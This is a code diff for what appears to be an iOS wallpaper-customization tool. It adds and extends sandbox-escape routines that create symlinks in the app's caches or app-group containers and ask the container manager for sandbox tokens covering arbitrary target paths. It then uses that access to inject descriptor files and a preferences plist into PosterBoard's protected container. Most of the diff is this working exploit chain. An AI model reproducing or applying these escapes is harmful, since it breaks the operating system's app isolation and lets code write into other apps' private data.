@@ -19,6 +19,7 @@ NSString * const BQErrorDomain = @"BQErrorDomain";
 static NSString * const kMGGroup = @"systemgroup.com.apple.mobilegestaltcache";
 static NSString * const kMGCaches = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
 static NSString * const kPBCollections = @"com.apple.WallpaperKit.CollectionsPoster";
+static NSString * const kPBCollectionsModern = @"com.apple.Posters.CollectionsPosterApp";
 static NSString * const kPBMercury = @"com.apple.MercuryPoster";
 static NSString * const kPBPhotos = @"com.apple.PhotosUIPrivate.PhotosPosterProvider";
 static NSString * const kPBExtVersion = @"61";
@@ -28,8 +29,11 @@ static NSString *gLogPath;
 static NSLock *gLogLock;
 static NSString *gGroupRoot;
 static NSString *gGroupID;
+static NSArray<NSString *> *gGroupIDs;
+static NSString *gEscapeGroupRoot;
 static int gTraversalState; // 0 unknown, 1 works, -1 unsupported
 static BOOL gClass2ParentEnabled;
+static NSString *gClass2SubpathLink;
 static dispatch_queue_t gWorkQueue;
 
 BOOL BQClass2ParentEnabled(void) { return gClass2ParentEnabled; }
@@ -95,12 +99,16 @@ NSString *BQGroupID(void) {
                 CFTypeRef val = copy(task, CFSTR("com.apple.security.application-groups"), NULL);
                 if (val && CFGetTypeID(val) == CFArrayGetTypeID()) {
                     CFArrayRef arr = (CFArrayRef)val;
+                    NSMutableArray *all = [NSMutableArray array];
                     for (CFIndex i = 0; i < CFArrayGetCount(arr); i++) {
                         CFTypeRef x = CFArrayGetValueAtIndex(arr, i);
                         if (x && CFGetTypeID(x) == CFStringGetTypeID()) {
-                            gGroupID = [(__bridge NSString *)x copy];
-                            break;
+                            [all addObject:[(__bridge NSString *)x copy]];
                         }
+                    }
+                    if (all.count) {
+                        gGroupIDs = [all copy];
+                        gGroupID = all.firstObject;
                     }
                 }
                 if (val) CFRelease(val);
@@ -121,6 +129,11 @@ NSString *BQGroupRoot(void) {
         }
     }
     return gGroupRoot;
+}
+
+NSArray<NSString *> *BQGroupIDs(void) {
+    BQGroupID();
+    return gGroupIDs ?: @[];
 }
 
 dispatch_queue_t BQWorkQueue(void) {
@@ -383,6 +396,59 @@ static int64_t bq_query_escape(uint64_t cls, NSString *ident, BOOL group,
 // Move it aside, recreate a small Library with a symlinked Caches, query class 2
 // and restore the original Library immediately. The token remains valid for the
 // resolved target.
+// Class 2 subpath symlink: create a symlink inside the app's own
+// Library/Caches and ask MCM for part 3 with a non-empty partDomain. This
+// keeps Library in place (no process-killing rename) and may make the daemon
+// resolve the symlink while issuing the extension. Safe to attempt: only a
+// temporary symlink inside Caches is touched.
+static int64_t bq_escape_class2_subpath(NSString *target, NSString **linkOut) {
+    NSString *home = NSHomeDirectory();
+    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
+    if (!home.length || !bid.length) return -6;
+    if (!g.set_domain) return -1;
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
+    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
+    NSString *leaf = [NSString stringWithFormat:@".bq_link_%d", getpid()];
+    NSString *link = [caches stringByAppendingPathComponent:leaf];
+    unlink(link.fileSystemRepresentation);
+    if (symlink(target.fileSystemRepresentation, link.fileSystemRepresentation) != 0) {
+        BQLog(@"class2-subpath: symlink failed errno=%d (%s)", errno, strerror(errno));
+        return -2;
+    }
+
+    NSArray *domains = @[
+        leaf,
+        [@"Caches/" stringByAppendingString:leaf],
+        [@"Library/Caches/" stringByAppendingString:leaf],
+    ];
+    int64_t last = -1;
+    for (NSString *domain in domains) {
+        NSString *path = nil;
+        int64_t h = bq_query_escape(2, bid, NO, 3, domain, 0x8100000000ULL,
+                                    [@"class2-subpath-" stringByAppendingString:domain], &path);
+        if (h >= 0) {
+            // A token for the symlink path is not enough: the editor needs the
+            // resolved target. Verify before reporting success.
+            DIR *d = opendir(target.fileSystemRepresentation);
+            if (!d) {
+                BQLog(@"class2-subpath: token did not open target (%@)", path ?: @"(null)");
+                if (g.release) g.release(h);
+                last = -5;
+                continue;
+            }
+            closedir(d);
+            unlink(link.fileSystemRepresentation);
+            if (linkOut) *linkOut = target;
+            BQLog(@"escape: using class2 subpath (%@) path=%@", domain, path ?: @"(null)");
+            return h;
+        }
+        last = h;
+    }
+    unlink(link.fileSystemRepresentation);
+    return last;
+}
+
 static int64_t bq_escape_class2_parent(NSString *target, NSString **linkOut) {
     NSString *home = NSHomeDirectory();
     NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
@@ -438,6 +504,13 @@ static int64_t bq_escape_class2_parent(NSString *target, NSString **linkOut) {
         bq_restore_path(lib, bak);
     }
     if (h >= 0) {
+        DIR *d = opendir(target.fileSystemRepresentation);
+        if (!d) {
+            BQLog(@"class2-parent: token did not open target");
+            if (g.release) g.release(h);
+            return -5;
+        }
+        closedir(d);
         if (linkOut) *linkOut = target;
         BQLog(@"escape: using class2 parent -> %@", target);
         return h;
@@ -446,31 +519,40 @@ static int64_t bq_escape_class2_parent(NSString *target, NSString **linkOut) {
 }
 
 static int64_t bq_escape_symlink(NSString *target, NSString **linkOut) {
-    NSString *groot = BQGroupRoot();
-    NSString *gid = BQGroupID();
-    if (!groot.length || !gid.length) return -6;
+    NSArray<NSString *> *ids = BQGroupIDs();
+    if (!ids.count) return -6;
     NSFileManager *fm = [NSFileManager defaultManager];
-    NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
-    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
-    NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bqtool"];
-    [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
-    bq_recover(lib, [groot stringByAppendingPathComponent:@"Library.bq_orig"]);
-    bq_recover(caches, bak);
-    if (![fm fileExistsAtPath:caches]) {
-        [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
-    }
-    if (!bq_swap_path(caches, target, bak)) {
+    int64_t last = -6;
+    for (NSString *gid in ids) {
+        NSURL *u = [fm containerURLForSecurityApplicationGroupIdentifier:gid];
+        NSString *groot = u.path;
+        if (!groot.length) continue;
+        NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
+        NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
+        NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bqtool"];
+        [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
+        bq_recover(lib, [groot stringByAppendingPathComponent:@"Library.bq_orig"]);
+        bq_recover(caches, bak);
+        if (![fm fileExistsAtPath:caches]) {
+            [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
+        }
+        if (!bq_swap_path(caches, target, bak)) {
+            bq_restore_path(caches, bak);
+            last = -2;
+            continue;
+        }
+        NSString *path = nil;
+        int64_t h = bq_query_escape(7, gid, YES, 3, @"", 0x8100000000ULL,
+                                    [@"class7-symlink/" stringByAppendingString:gid], &path);
+        if (h >= 0) {
+            gEscapeGroupRoot = groot;
+            if (linkOut) *linkOut = caches;
+            return h;
+        }
         bq_restore_path(caches, bak);
-        return -2;
+        last = h;
     }
-    NSString *path = nil;
-    int64_t h = bq_query_escape(7, gid, YES, 3, @"", 0x8100000000ULL, @"class7-symlink", &path);
-    if (h >= 0) {
-        if (linkOut) *linkOut = caches;
-        return h;
-    }
-    bq_restore_path(caches, bak);
-    return h;
+    return last;
 }
 
 int64_t BQEscape(NSString *target, NSString **linkOut) {
@@ -508,7 +590,21 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 3. Class 2 parent-directory symlink. No app group needed: move the app's
+    // 3. Class 2 symlink inside the existing Library/Caches. This is safe and
+    //    needs no app group; it only works if MCM follows a relative symlink in
+    //    partDomain without rejecting the resolved target.
+    {
+        NSString *link = nil;
+        int64_t h = bq_escape_class2_subpath(target, &link);
+        if (h >= 0) {
+            if (linkOut) *linkOut = link ?: target;
+            BQLog(@"escape: using class2 subpath");
+            return h;
+        }
+        last = h;
+    }
+
+    // 4. Class 2 parent-directory symlink. No app group needed: move the app's
     //    Library aside, create Library/Caches -> target, query the app's own
     //    container (class 2), then restore Library. Off by default: some builds
     //    kill the process for moving Library, so this is opt-in from Settings.
@@ -527,7 +623,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         BQLog(@"class2-parent disabled (enable in Settings if there is no app group)");
     }
 
-    // 4. Class 13 direct MobileGestalt query (some 27.0.x builds).
+    // 5. Class 13 direct MobileGestalt query (some 27.0.x builds).
     if ([target isEqualToString:kMGCaches]) {
         NSString *p = nil;
         int64_t h = bq_query_escape(13, kMGGroup, YES, 3, @"", 0x8100000000ULL,
@@ -540,7 +636,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 5. Class 12 geod part-domain traversal (older builds).
+    // 6. Class 12 geod part-domain traversal (older builds).
     if (target.isAbsolutePath) {
         NSString *dom = [bq_dots(12) stringByAppendingString:target];
         NSString *p = nil;
@@ -560,20 +656,25 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
 
 static NSString *bq_escape_error(int64_t h) {
     if (h == -6) {
-        return @"no app group — open Settings → Class-2 fallback (experimental), enable it, then retry";
+        return NSLocalizedString(@"no app group — open Settings → Class-2 fallback (experimental), enable it, then retry", nil);
     }
     if (h == -2) {
-        return @"class-2 fallback could not move Library — this build needs an app group on 27.2";
+        return NSLocalizedString(@"class-2 fallback could not move Library — this build needs an app group on 27.2", nil);
     }
     if (h == -5) {
-        return @"the MCM query returned no sandbox token — send Documents/bqtool.log";
+        return NSLocalizedString(@"the MCM query returned no sandbox token — send Documents/bqtool.log", nil);
     }
-    return [NSString stringWithFormat:@"escape failed (%lld)", (long long)h];
+    return [NSString stringWithFormat:NSLocalizedString(@"escape failed (%lld)", nil), (long long)h];
 }
 
 void BQEndEscape(int64_t handle) {
     if (handle >= 0 && g.release) g.release(handle);
-    NSString *groot = BQGroupRoot();
+    if (gClass2SubpathLink.length) {
+        unlink(gClass2SubpathLink.fileSystemRepresentation);
+        gClass2SubpathLink = nil;
+    }
+    NSString *groot = gEscapeGroupRoot;
+    gEscapeGroupRoot = nil;
     if (!groot.length) return;
     NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
     NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
@@ -989,7 +1090,7 @@ static void bq_randomize_descriptor(NSString *dir) {
 
 // ------------------------------------------------------------ PosterBoard ---
 NSArray<NSString *> *BQPosterBoardExtensions(void) {
-    return @[kPBCollections, kPBMercury, kPBPhotos];
+    return @[kPBCollections, kPBCollectionsModern, kPBMercury, kPBPhotos];
 }
 
 NSString *BQPosterBoardDescriptorsPath(NSString *ext) {
@@ -1061,6 +1162,41 @@ static BOOL bq_ensure_pb_descriptors(NSString *container, NSString *ext, NSStrin
     return ok;
 }
 
+// PosterBoard keeps a migration/refresh marker in its unprotected defaults.
+// Writing it after injecting descriptors forces the provider cache to rebuild
+// instead of leaving a half-registered (gray) poster.
+static BOOL bq_write_pb_refresh_prefs(NSString *container) {
+    NSString *link = nil;
+    int64_t h = BQEscape(container, &link);
+    if (h < 0) {
+        BQLog(@"PB prefs: escape failed (%lld)", (long long)h);
+        return NO;
+    }
+    NSString *prefs = [link stringByAppendingPathComponent:@"Library/Preferences"];
+    [[NSFileManager defaultManager] createDirectoryAtPath:prefs withIntermediateDirectories:YES attributes:nil error:nil];
+    NSDictionary *d = @{
+        @"PBF_RESET_FILE_PROTECTIONS": @YES,
+        @"PBF_LOCALE_DID_CHANGE": @NO,
+        @"PersistedPosterContainerBundleIdentifiers": @[kPBCollectionsModern, kPBCollections],
+        @"CompletedPosterBundleIdentifierMigrations": @[
+            @"com.apple.Posters.UnityPosterApp.ExtragalacticPoster",
+            @"com.apple.Posters.WeatherPosterApp.WeatherPoster",
+            @"com.apple.Posters.UnityPosterApp.Unity2025Poster",
+            @"com.apple.Posters.UnityPosterApp.UnityPosterExtension",
+            @"com.apple.Posters.UnityPosterApp.RhizomePoster",
+            @"com.apple.Posters.KaleidoscopePosterApp.KaleidoscopePoster",
+        ],
+    };
+    NSData *data = [NSPropertyListSerialization dataWithPropertyList:d
+                                                              format:NSPropertyListBinaryFormat_v1_0
+                                                             options:0 error:nil];
+    NSString *path = [prefs stringByAppendingPathComponent:@"com.apple.PosterBoard.unprotectedUserDefaults.plist"];
+    BOOL ok = data.length && [data writeToFile:path atomically:NO];
+    BQLog(@"PB prefs refresh write=%@ path=%@", ok ? @"OK" : @"FAIL", path);
+    BQEndEscape(h);
+    return ok;
+}
+
 BOOL BQApplyTendies(NSURL *url, int *count, NSString **err) {
     NSData *data = [NSData dataWithContentsOfURL:url];
     if (data.length < 4 || ((const uint8_t *)data.bytes)[0] != 'P' || ((const uint8_t *)data.bytes)[1] != 'K') {
@@ -1099,27 +1235,38 @@ BOOL BQApplyTendies(NSURL *url, int *count, NSString **err) {
         else if ([lower containsString:@"photosposter"] || [lower containsString:@"video-descriptor"]) ext = kPBPhotos;
         else if ([lower containsString:@"wallpaperkit"]) ext = kPBCollections;
 
-        bq_randomize_descriptor(folder);
-        bq_ensure_pb_descriptors(container, ext, NULL);
-        NSString *target = [container stringByAppendingPathComponent:
-            [NSString stringWithFormat:@"Library/Application Support/PRBPosterExtensionDataStore/%@/Extensions/%@/descriptors",
-             kPBExtVersion, ext]];
-        NSString *link = nil;
-        int64_t h = BQEscape(target, &link);
-        if (h < 0) {
-            BQLog(@"apply: escape to %@ failed (%lld)", ext, (long long)h);
-            continue;
+        BOOL preserveIDs = [folder containsString:@"/container/"];
+        if (!preserveIDs) bq_randomize_descriptor(folder);
+        NSString *destName = preserveIDs ? folder.lastPathComponent : NSUUID.UUID.UUIDString;
+        NSMutableArray *targets = [NSMutableArray arrayWithObject:ext];
+        if ([ext isEqualToString:kPBCollections]) [targets addObject:kPBCollectionsModern];
+
+        BOOL wroteOne = NO;
+        for (NSString *targetExt in targets) {
+            bq_ensure_pb_descriptors(container, targetExt, NULL);
+            NSString *target = [container stringByAppendingPathComponent:
+                [NSString stringWithFormat:@"Library/Application Support/PRBPosterExtensionDataStore/%@/Extensions/%@/descriptors",
+                 kPBExtVersion, targetExt]];
+            NSString *link = nil;
+            int64_t h = BQEscape(target, &link);
+            if (h < 0) {
+                BQLog(@"apply: escape to %@ failed (%lld)", targetExt, (long long)h);
+                continue;
+            }
+            NSString *dest = [link stringByAppendingPathComponent:destName];
+            if (preserveIDs) [[NSFileManager defaultManager] removeItemAtPath:dest error:nil];
+            NSError *e = nil;
+            if ([[NSFileManager defaultManager] copyItemAtPath:folder toPath:dest error:&e]) {
+                wroteOne = YES;
+                BQLog(@"apply: %@ -> %@", folder.lastPathComponent, targetExt);
+            } else {
+                BQLog(@"apply: copy %@ -> %@ failed: %@", folder, targetExt, e);
+            }
+            BQEndEscape(h);
         }
-        NSString *dest = [link stringByAppendingPathComponent:NSUUID.UUID.UUIDString];
-        NSError *e = nil;
-        if ([[NSFileManager defaultManager] copyItemAtPath:folder toPath:dest error:&e]) {
-            written++;
-            BQLog(@"apply: %@ -> %@", folder.lastPathComponent, ext);
-        } else {
-            BQLog(@"apply: copy %@ -> %@ failed: %@", folder, ext, e);
-        }
-        BQEndEscape(h);
+        if (wroteOne) written++;
     }
+    if (written) bq_write_pb_refresh_prefs(container);
     [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
     if (count) *count = written;
     if (written == 0) {
